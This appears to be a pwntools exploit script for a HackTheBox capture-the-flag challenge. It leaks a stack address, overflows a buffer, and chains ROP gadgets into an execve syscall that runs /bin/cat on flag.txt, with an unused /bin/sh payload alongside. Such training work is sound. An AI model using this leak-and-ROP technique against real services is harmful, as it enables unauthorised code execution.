from pwn import *
import struct

#def attach(addr):
#	gdb.attach(r, 'b *{:#x}\nc'.format(addr + r.libs()[elf.path]))


p = lambda x : struct.pack('<Q', x)

r = remote("docker.hackthebox.eu", 53763)


#elf = ELF('./ropmev2')
#r = process(elf.path)

r.recvline()
r.sendline("DEBUG")

good_response = r.recvline()
r.recvline()
stack_leak = int(good_response[25:40].strip('\n'), 16)
print "[*] STACK LEAK:", hex(stack_leak)

#################################
#	    GADGETS                 #
#################################
"""
0x0000000000401168: syscall; ret;
0x0000000000401162: pop rax; ret;
0x000000000040142b: pop rdi; ret;
0x0000000000401164: pop rdx; pop r13; ret;
0x0000000000401429: pop rsi; pop r15; ret;
"""

POP_RAX = p64(0x0000000000401162)
POP_RDI = p64(0x000000000040142b)
POP_RSI = p64(0x0000000000401429)
POP_RDX = p64(0x0000000000401164)
SYSCALL = p64(0x0000000000401168)


BUFFER_LEN = 216
sh = "/bin/sh\x00"
cat_flag = "/bin/cat\x00flag.txt\x00"


payload1 = ""
payload1 += '\x00' + sh + 'A' * (BUFFER_LEN - 1 - len(sh)) 
payload1 += POP_RAX
payload1 +=	p(59)
payload1 += POP_RDI
payload1 += p(stack_leak - 223)
payload1 += POP_RSI
payload1 += p(0)
payload1 += p(0)
payload1 += POP_RDX
payload1 += p(0)
payload1 += p(0)
payload1 += SYSCALL

#attach(0x1212)

payload2 = ""
payload2 += '\x00' + cat_flag + p(stack_leak - 223) + p(stack_leak - 223  + 9) + p(0) + 'A' * (BUFFER_LEN - 1 - len(cat_flag) - 8 * 3)
payload2 += POP_RAX
payload2 += p(59)
payload2 += POP_RDI
payload2 += p(stack_leak - 223)
payload2 += POP_RSI
payload2 += p(stack_leak - 223 + len(cat_flag))
payload2 += p(0)
payload2 += POP_RDX
payload2 += p(0)
payload2 += p(0)
payload2 += SYSCALL



r.sendline(payload2)
r.interactive()


